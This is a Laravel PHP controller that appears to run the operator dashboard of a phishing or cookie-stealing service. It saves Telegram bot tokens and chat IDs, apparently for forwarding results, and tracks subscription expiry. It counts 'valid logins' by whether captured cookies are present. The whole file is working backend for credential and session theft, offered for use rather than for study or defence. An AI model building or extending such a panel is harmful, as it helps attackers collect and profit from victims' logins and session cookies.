<?php

namespace App\Http\Controllers;


use Illuminate\Http\Request;
use App\Models\UserSetting;
use App\Models\User;

class UserSettingController extends Controller
{
    //
 public function update(Request $request)
{
     $loginKey = auth()->user()->login_key;
    $request->validate([
        'telegram_id_1' => 'nullable|string',
        'telegram_bot_1' => 'nullable|string',
        'telegram_id_2' => 'nullable|string',
        'telegram_bot_2' => 'nullable|string',
        'login_key' => 'nullable|string',
    ]);

    $settings = UserSetting::firstOrCreate([
        'user_id' => auth()->id(),
    ]);

    $settings2 = User::firstOrCreate([
        'login_key' => $loginKey,
    ]);

    $settings->update([
        'telegram_id_1' => $request->telegram_id_1,
        'telegram_bot_1' => $request->telegram_bot_1,
        'telegram_id_2' => $request->telegram_id_2,
        'telegram_bot_2' => $request->telegram_bot_2,
        
    ]);

    $settings2->update([
        'login_key' => $request->login_key,
    ]);

    return back()->with('success', 'Telegram settings updated!');
}

public function index()
{
    // Ambil user setting utk user sekarang
    $settings = UserSetting::first();

    // Ambil key unik user (disimpan di kolom password)
    $userKey = auth()->user()->password;
    $loginKey = auth()->user()->login_key;
    // Status subscription
    $status = now()->lte($settings->subscription_until) ? 'Active' : 'Expired';

    // === Counter sinkron sesuai user === //

    // Valid Visitors (berdasarkan key_user)
    $validVisitors = \App\Models\ValidVisitor::where('key_user', $userKey)->count();

    // Invalid Login = cookies NULL + key_user cocok
    $invalidLogin = \App\Models\ValidLogin::whereNull('cookies')
                        ->where('key_user', $userKey)
                        ->count();

    // Valid Login = cookies NOT NULL + key_user cocok
    $validLogin = \App\Models\ValidLogin::whereNotNull('cookies')
                        ->where('key_user', $userKey)
                        ->count();

    return view('admin.dashboard', [
        "settings"      => $settings,
        "status"        => $status,
        "validVisitors" => $validVisitors,
        "invalidLogin"  => $invalidLogin,
        "validLogin"    => $validLogin,
        "login_key"          => $loginKey
    ]);
}


public function settings()
{
    $user = auth()->user();

    return view('admin.settings', [
        'login_key' => $user->login_key
    ]);
}

public function updateKey(Request $request)
{
    $request->validate([
        'login_key' => 'required|string|max:255'
    ]);

    $user = auth()->user();
    $user->login_key = $request->login_key;
    $user->save();

    return back()->with('success', 'Login key updated!');
}

}


